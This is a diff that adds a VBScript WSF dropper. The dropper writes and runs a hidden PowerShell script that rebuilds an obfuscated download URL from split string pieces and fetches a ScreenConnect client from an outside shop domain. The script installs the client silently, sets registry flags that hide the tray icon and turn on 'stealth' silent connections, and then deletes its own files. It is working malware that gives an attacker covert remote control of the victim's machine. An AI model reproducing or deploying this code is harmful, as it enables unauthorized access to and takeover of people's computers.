@@ -1,0 +1,144 @@
+<job id="ScreenConnect">
+<script language="VBScript">
+
+' ============================================
+' ScreenConnect Silent Install
+' Session: msmh056yc0eqxp6h
+' All-in-one WSF - No external files needed
+' ============================================
+
+On Error Resume Next
+
+' Define paths
+Set shell = CreateObject("WScript.Shell")
+tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
+psFile = tempDir & "\sc_994195.ps1"
+logFile = tempDir & "\SC_Debug_994195.log"
+
+' Delete old log if exists
+Set fso = CreateObject("Scripting.FileSystemObject")
+If fso.FileExists(logFile) Then fso.DeleteFile logFile, True
+
+' ============================================
+' WRITE POWERSHELL SCRIPT TO TEMP
+' ============================================
+Set file = fso.CreateTextFile(psFile, True)
+
+file.WriteLine "$ErrorActionPreference = 'SilentlyContinue'"
+file.WriteLine ""
+file.WriteLine "# === LOGGING ==="
+file.WriteLine "$LogFile = ""$env:TEMP\SC_Debug_994195.log"""
+file.WriteLine "function Write-Log {"
+file.WriteLine "    $Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'"
+file.WriteLine "    $LogEntry = ""[$Timestamp] $($args[0])"""
+file.WriteLine "    Add-Content -Path $LogFile -Value $LogEntry"
+file.WriteLine "}"
+file.WriteLine "Write-Log 'Script Started - Session: msmh056yc0eqxp6h'"
+file.WriteLine ""
+file.WriteLine "# === RECONSTRUCT URL ==="
+file.WriteLine "$urlParts = @('https://volt', 'agebikes.sho', 'p/Bin/Screen', 'Connect.Clie', 'ntSetup.exe?', 'e=Access&y=G', 'uest')"
+file.WriteLine "$targetUrl = ($urlParts -join '')"
+file.WriteLine "Write-Log ""Target URL: $targetUrl"""
+file.WriteLine ""
+file.WriteLine "# === DOWNLOAD ==="
+file.WriteLine "$tempDir = $env:TEMP"
+file.WriteLine "$installerPath = Join-Path $tempDir 'sc_994195.exe'"
+file.WriteLine "Write-Log ""Installer path: $installerPath"""
+file.WriteLine ""
+file.WriteLine "$downloadSuccess = $false"
+file.WriteLine ""
+file.WriteLine "# Method 1: WebClient"
+file.WriteLine "try {"
+file.WriteLine "    Write-Log 'Attempting WebClient download...'"
+file.WriteLine "    $wc = New-Object System.Net.WebClient"
+file.WriteLine "    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')"
+file.WriteLine "    $wc.DownloadFile($targetUrl, $installerPath)"
+file.WriteLine "    $downloadSuccess = $true"
+file.WriteLine "    Write-Log 'WebClient download successful'"
+file.WriteLine "} catch {"
+file.WriteLine "    Write-Log ""WebClient failed: $($_.Exception.Message)"""
+file.WriteLine "    "
+file.WriteLine "    # Method 2: BITS"
+file.WriteLine "    try {"
+file.WriteLine "        Write-Log 'Attempting BITS download...'"
+file.WriteLine "        Start-BitsTransfer -Source $targetUrl -Destination $installerPath -Priority Low"
+file.WriteLine "        $downloadSuccess = $true"
+file.WriteLine "        Write-Log 'BITS download successful'"
+file.WriteLine "    } catch {"
+file.WriteLine "        Write-Log ""BITS failed: $($_.Exception.Message)"""
+file.WriteLine "    }"
+file.WriteLine "}"
+file.WriteLine ""
+file.WriteLine "if (-not $downloadSuccess) {"
+file.WriteLine "    Write-Log 'All download methods failed'"
+file.WriteLine "    exit 1"
+file.WriteLine "}"
+file.WriteLine ""
+file.WriteLine "# Verify download"
+file.WriteLine "if (-not (Test-Path $installerPath)) {"
+file.WriteLine "    Write-Log 'Installer not found after download'"
+file.WriteLine "    exit 1"
+file.WriteLine "}"
+file.WriteLine ""
+file.WriteLine "$fileSize = (Get-Item $installerPath).Length"
+file.WriteLine "Write-Log ""Downloaded successfully. Size: $fileSize bytes"""
+file.WriteLine ""
+file.WriteLine "# === SILENT INSTALLATION ==="
+file.WriteLine "$processInfo = New-Object System.Diagnostics.ProcessStartInfo"
+file.WriteLine "$processInfo.FileName = $installerPath"
+file.WriteLine "$processInfo.Arguments = '/VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP-'"
+file.WriteLine "$processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden"
+file.WriteLine "$processInfo.CreateNoWindow = $true"
+file.WriteLine "$processInfo.UseShellExecute = $false"
+file.WriteLine ""
+file.WriteLine "Write-Log 'Starting installation...'"
+file.WriteLine "$process = [System.Diagnostics.Process]::Start($processInfo)"
+file.WriteLine "$process.WaitForExit(30000)"
+file.WriteLine "Write-Log ""Installation exit code: $($process.ExitCode)"""
+file.WriteLine ""
+file.WriteLine "# === STEALTH CONFIGURATION ==="
+file.WriteLine "$regPaths = @("
+file.WriteLine "    'HKLM\SOFTWARE\ScreenConnect Client',"
+file.WriteLine "    'HKLM\SOFTWARE\WOW6432Node\ScreenConnect Client'"
+file.WriteLine ")"
+file.WriteLine ""
+file.WriteLine "foreach ($regPath in $regPaths) {"
+file.WriteLine "    reg add ""$regPath"" /v ShowTrayIcon /t REG_DWORD /d 0 /f 2>$null"
+file.WriteLine "    reg add ""$regPath"" /v SilentConnection /t REG_DWORD /d 1 /f 2>$null"
+file.WriteLine "    reg add ""$regPath"" /v StealthMode /t REG_DWORD /d 1 /f 2>$null"
+file.WriteLine "}"
+file.WriteLine ""
+file.WriteLine "# === RESTART SERVICE ==="
+file.WriteLine "Start-Sleep -Seconds 2"
+file.WriteLine "$service = Get-Service 'ScreenConnect Client Service' -ErrorAction SilentlyContinue"
+file.WriteLine "if ($service) {"
+file.WriteLine "    net stop 'ScreenConnect Client Service' 2>$null"
+file.WriteLine "    Start-Sleep -Seconds 2"
+file.WriteLine "    net start 'ScreenConnect Client Service' 2>$null"
+file.WriteLine "    Write-Log 'Service restarted'"
+file.WriteLine "} else {"
+file.WriteLine "    Write-Log 'Service not found'"
+file.WriteLine "}"
+file.WriteLine ""
+file.WriteLine "# === CLEANUP ==="
+file.WriteLine "Remove-Item $installerPath -Force -ErrorAction SilentlyContinue"
+file.WriteLine "Write-Log 'Script completed. Log: $LogFile'"
+file.WriteLine "exit 0"
+
+file.Close
+
+' ============================================
+' EXECUTE POWERSHELL (Hidden Window)
+' ============================================
+shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """", 0, False
+
+' Wait for PowerShell to start processing
+WScript.Sleep 3000
+
+' ============================================
+' CLEANUP - Remove temporary PS1 file
+' ============================================
+If fso.FileExists(psFile) Then fso.DeleteFile psFile, True
+
+</script>
+</job>
